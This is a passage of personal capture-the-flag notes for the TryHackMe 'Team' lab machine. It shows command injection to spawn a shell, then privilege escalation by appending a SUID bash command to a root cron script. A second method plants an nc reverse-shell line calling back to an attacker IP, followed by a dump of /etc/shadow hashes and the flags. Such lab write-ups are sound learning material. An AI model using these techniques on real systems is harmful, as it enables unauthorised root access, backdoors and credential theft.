date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"

El script hace lo siguiente:

1.  Muestra un mensaje de "Leyendo estadísticas." y espera 1 segundo.
2.  Muestra un mensaje de "Leyendo estadísticas.." y espera 1 segundo.
3.  Pide al usuario que ingrese el nombre de la persona que está respaldando los datos y almacena la entrada en una variable llamada "name".
4.  Agrega la variable "name" al archivo /var/stats/stats.txt.
5.  Pide al usuario que ingrese la palabra "fecha" para timbrar el archivo.
6.  Muestra un mensaje que dice "La fecha es" y luego ejecuta el comando "error" y redirige el error a /dev/null (que es un archivo especial que se utiliza para descartar la salida).
7.  Almacena la fecha actual en una variable llamada "date_save" en el formato "AAAA-MM-DD-HH-MM".
8.  Hace una copia de seguridad del archivo /var/stats/stats.txt en un archivo llamado /var/stats/stats-AAAA-MM-DD-HH-MM.bak utilizando la variable "date_save".
9.  Muestra un mensaje que dice "Las estadísticas han sido respaldadas".


dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: /bin/bash
Enter 'date' to timestamp the file: /bin/bash
The Date is whoami
gyles
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
gyles@TEAM:~$ whoami
gyles

privesc

gyles@TEAM:~$ sudo -l
[sudo] password for gyles: 
Sorry, try again.
[sudo] password for gyles: 
Sorry, try again.
[sudo] password for gyles: 
sudo: 3 incorrect password attempts

gyles@TEAM:/home/gyles$ cd /
gyles@TEAM:/$ ls
bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
gyles@TEAM:/$ cd opt
gyles@TEAM:/opt$ ls
admin_stuff
gyles@TEAM:/opt$ cd admin_stuff/
gyles@TEAM:/opt/admin_stuff$ ls
script.sh
gyles@TEAM:/opt/admin_stuff$ cat script.sh 
#!/bin/bash
#I have set a cronjob to run this script every minute

dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site

gyles@TEAM:/$ cd usr/local/
gyles@TEAM:/usr/local$ ls -lah
total 40K
drwxr-xr-x 10 root root  4.0K Jan 15  2021 .
drwxr-xr-x 10 root root  4.0K Jan 15  2021 ..
drwxrwxr-x  2 root admin 4.0K Jan 17  2021 bin
drwxr-xr-x  2 root root  4.0K Apr 26  2018 etc
drwxr-xr-x  2 root root  4.0K Apr 26  2018 games
drwxr-xr-x  2 root root  4.0K Apr 26  2018 include
drwxr-xr-x  3 root root  4.0K Jan 15  2021 lib
lrwxrwxrwx  1 root root     9 Jan 15  2021 man -> share/man
drwxr-xr-x  2 root root  4.0K Jan 17  2021 sbin
drwxr-xr-x  4 root root  4.0K Jan 15  2021 share
drwxr-xr-x  2 root root  4.0K Apr 26  2018 src

I have full r/w permsissions so anything in put in the script will be executed as root. in /bin

gyles@TEAM:/usr/local$ cd bin
gyles@TEAM:/usr/local/bin$ ls
main_backup.sh
gyles@TEAM:/usr/local/bin$ ls -lah
total 12K
drwxrwxr-x  2 root admin 4.0K Jan 17  2021 .
drwxr-xr-x 10 root root  4.0K Jan 15  2021 ..
-rwxrwxr-x  1 root admin   65 Jan 17  2021 main_backup.sh
gyles@TEAM:/usr/local/bin$ echo "chmod +s /bin/bash" >> main_backup.sh
gyles@TEAM:/usr/local/bin$ /bin/bash -p
bash-4.4# whoami
root
bash-4.4# exit
exit
gyles@TEAM:/usr/local/bin$ /bin/bash
bash-4.4$ whoami
gyles
bash-4.4$ cd /root
bash: cd: /root: Permission denied
bash-4.4$ exit
exit
gyles@TEAM:/usr/local/bin$ cat main_backup.sh 
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
chmod +s /bin/bash

gyles@TEAM:/usr/local/bin$ /bin/bash -p
bash-4.4# cat /root/root.txt
THM{fhqbznavfonq}

another way

gyles@TEAM:/usr/local/bin$ nano main_backup.sh 
Unable to create directory /home/dale/.local/share/nano/: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

gyles@TEAM:/usr/local/bin$ cat main_backup.sh 
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.19.103 1337 >/tmp/f

┌──(kali㉿kali)-[~/team]
└─$ rlwrap nc -lnvp 1337                                  
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.167.117.
Ncat: Connection from 10.10.167.117:38536.
bash: cannot set terminal process group (2550): Inappropriate ioctl for device
bash: no job control in this shell
root@TEAM:~# whoami;cat /root/root.txt;cat /etc/shadow
whoami;cat /root/root.txt;cat /etc/shadow
root
THM{fhqbznavfonq}
root:$6$xuuJwXec$qc1o9t6ZiJgSSp37ODrG4WBnE8schSnQ/IHiWvLNo/w42X2U9WkMR689AXYkN.wwM83yTDRQ3rCtTlz1mN9rm0:18644:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7:::
games:*:17647:0:99999:7:::
man:*:17647:0:99999:7:::
lp:*:17647:0:99999:7:::
mail:*:17647:0:99999:7:::
news:*:17647:0:99999:7:::
uucp:*:17647:0:99999:7:::
proxy:*:17647:0:99999:7:::
www-data:*:17647:0:99999:7:::
backup:*:17647:0:99999:7:::
list:*:17647:0:99999:7:::
irc:*:17647:0:99999:7:::
gnats:*:17647:0:99999:7:::
nobody:*:17647:0:99999:7:::
systemd-network:*:17647:0:99999:7:::
systemd-resolve:*:17647:0:99999:7:::
syslog:*:17647:0:99999:7:::
messagebus:*:17647:0:99999:7:::
_apt:*:17647:0:99999:7:::
lxd:*:18642:0:99999:7:::
uuidd:*:18642:0:99999:7:::
dnsmasq:*:18642:0:99999:7:::
landscape:*:18642:0:99999:7:::
pollinate:*:18642:0:99999:7:::
dale:$6$OD7sttk0$u3wdqLBRI6wyHQg610OgQvG/kga9w4xx90YQ4lVYZsQ4txK3qfBnhGL2N5DOFPA7qfMQuLZpB.dpNL7beqAtk0:18644:0:99999:7:::
gyles:$6$fEb0A7IP$U/eT3u7lo3OiDr/ssF.VxtSYb/n.vaqUjehRP.R7XqvsTSYW5YFIgL8G8UPO.YxVsSUVAXAgwe86p4PqxBoGR.:18644:0:99999:7:::
ftpuser:$6$4uqJHENY$pGEGsZOmkquSGZdvHe7lZibsSCoXSvJ6wZ.LhJiFRA.R4Jy1FfbG5nBK/Y41uT/XyPL3T36XigwMquL8XB90r.:18642:0:99999:7:::
ftp:*:18642:0:99999:7:::
sshd:*:18642:0:99999:7:::

:)

```

![[Pasted image 20221222232514.png]]

![[Pasted image 20221222235959.png]]

![[Pasted image 20221223002308.png]]

![[Pasted image 20221223002513.png]]

![[Pasted image 20221223003101.png]]

user.txt
As the "dev" site is under contruction maybe it has some flaws? "url?=" + "This rooms picture"
*THM{6Y0TXHz7c2d}*
  
root.txt
Is root running anything automated? ps I like PATH s
*THM{fhqbznavfonq}*


[[Ra 2]]